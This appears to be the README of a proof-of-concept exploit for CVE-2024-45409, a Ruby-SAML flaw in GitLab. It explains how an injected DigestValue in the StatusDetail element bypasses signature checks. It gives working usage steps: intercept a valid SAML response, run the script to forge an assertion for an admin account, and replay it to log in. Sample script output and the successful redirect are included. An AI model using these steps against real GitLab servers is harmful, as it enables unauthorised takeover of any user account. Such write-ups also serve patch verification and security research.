# Ruby-SAML / GitLab Authentication Bypass (CVE-2024-45409) exploit

This script exploits the [CVE-2024-45409](https://nvd.nist.gov/vuln/detail/CVE-2024-45409) that allows an unauthenticated attacker with access to any signed SAML document issued by the IDP to forge a SAML Response/Assertion and gain access as any user on GitLab. 

All the following GitLab (CE/EE) versions are vulnerable:
* < 16.11.10
* 17.0.0 < 17.0.8
* 17.0.0 < 17.1.8
* 17.0.0 < 17.2.7
* 17.0.0 < 17.3.3

This exploit injects the `DigestValue` of the modified assertion into the `StatusDetail` element, allowing it to smuggle the XPath selector that will use this value instead of the one in the `SignedInfo` block.

## Requirements

* A valid SAML Response issued by the IDP

## Usage

```bash
apt install python3-lxml
```

Intercept the URL and Base64-encoded IDP SAML response first, then modify the XML content using the script.

```http
POST /users/auth/saml/callback HTTP/1.1
Host: gitlab.test.local
[...]

SAMLResponse=PHNhbWxwOlJlc3Bv[...]
```

```bash
$ python3 CVE-2024-45409.py -r response.url_base64 -n admin@test.local -d -e -o response_patched.url_base64
[+] Parse response
	Digest algorithm: sha256
	Canonicalization Method: http://www.w3.org/2001/10/xml-exc-c14n#
[+] Remove signature from response
[+] Patch assertion ID
[+] Patch assertion NameID
[+] Patch assertion conditions
[+] Move signature in assertion
[+] Patch response ID
[+] Insert malicious reference
[+] Clone signature reference
[+] Create status detail element
[+] Patch digest value
[+] Write patched file in response_patched.url_base64
```

Afterward, replace the parameter `SAMLResponse` value with the script output. If authentication is successful, you will be redirected to the GitLab homepage.
```http
HTTP/1.1 302 Found
Location: http://gitlab.test.local/
[...]

<html><body>You are being <a href="http://gitlab.test.local/">redirected</a>.</body></html>
```

## References
* https://about.gitlab.com/releases/2024/09/17/patch-release-gitlab-17-3-3-released/
* https://github.com/advisories/GHSA-jw9c-mfg7-9rx2
* https://blog.projectdiscovery.io/ruby-saml-gitlab-auth-bypass/
* https://nvd.nist.gov/vuln/detail/CVE-2024-45409
* https://www.cvedetails.com/cve/CVE-2024-45409/
